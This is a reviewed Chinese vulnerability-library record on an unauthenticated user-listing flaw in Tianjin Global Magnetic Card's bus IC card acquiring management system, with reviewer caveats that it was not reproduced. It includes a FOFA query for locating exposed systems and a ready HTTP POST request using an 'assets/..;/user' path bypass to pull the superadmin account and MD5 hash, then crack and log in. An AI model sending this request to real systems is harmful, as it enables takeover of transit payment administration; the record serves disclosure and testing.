---
source: "wy876 漏洞文库"
title: "天津环球磁卡公交IC卡收单管理 user无授权枚举及密码哈希泄露声称"
product: "天津环球磁卡公交IC卡收单管理"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知；assets/..;路径处理条件"
prerequisites: "请求无Cookie"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/fi2seglgfyashlz8"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E5%A4%A9%E6%B4%A5%E7%8E%AF%E7%90%83%E7%A3%81%E5%8D%A1%E8%82%A1%E4%BB%BD%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8/%E5%85%AC%E4%BA%A4IC%E5%8D%A1%E6%94%B6%E5%8D%95%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fuser%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md"
fofa: "app=\"公交IC卡收单管理系统\""
id: "vw-dc72f845f575226e6118cdd5"
entity_id: "ve-dc72f845f575226e6118cdd5"
schema_version: "1"
---

# 天津环球磁卡公交IC卡收单管理 user无授权枚举及密码哈希泄露声称

## 条目说明

- 对象与具体问题：天津环球磁卡公交IC卡收单管理；user无授权枚举及密码哈希泄露声称
- 版本、配置及部署条件：版本未知；assets/..;路径处理条件
- 认证与权限前提：请求无Cookie
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 没有实际响应字段，超管身份和MD5格式都需证据，不能仅声明得到
- MD5是哈希不能叫解密，弱口令破解不保证登录成功
- 建议最少数据/脱敏证明，补配置/修复版本

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

#### 一、漏洞描述
天津环球磁卡股份有限公司公交IC卡收单管理系统是城市公共交通领域中不可或缺的一部分，它通过集成先进的集成电路技术（IC卡）实现了乘客便捷的支付方式，并有效提高了公共交通运营效率。系统集成了发卡、充值、消费、数据采集、查询和注销等多个功能模块，为公交公司和乘客提供了全面、高效、便捷的公共交通支付解决方案。该系统不仅提升了乘客的出行体验，还降低了公交公司的运营成本，提高了管理效率。公交IC卡收单管理系统user存在信息泄露漏洞可获取超管用户密码等信息。

#### 二、影响版本
公交IC卡收单管理系统

#### 三、资产测绘
fofa：app="公交IC卡收单管理系统"


#### 四、漏洞复现
```http
POST /assets/..;/user HTTP/1.1
Host: xxx
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:130.0) Gecko/20100101 Firefox/130.0
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
X-Requested-With: XMLHttpRequest
Priority: u=0

_search=false&nd=1727275150716&rowCountPerPage=10&pageNo=1&sidx=USER_NAME&sord=asc&method=select&USER_NAME=&REAL_NAME=&ACCOUNT_EXPIRE_TIME=%E5%BF%BD%E7%95%A5&PASSWORD_EXPIRE_TIME=%E5%BF%BD%E7%95%A5
```

> 请求长度说明：原资料 Content-Length 为 197；静态长度已移除，应由客户端根据最终请求体的字节数生成。

执行POC获取超管用户和MD5密码


使用获取到的MD5密码进行解密并登录


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/fi2seglgfyashlz8>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
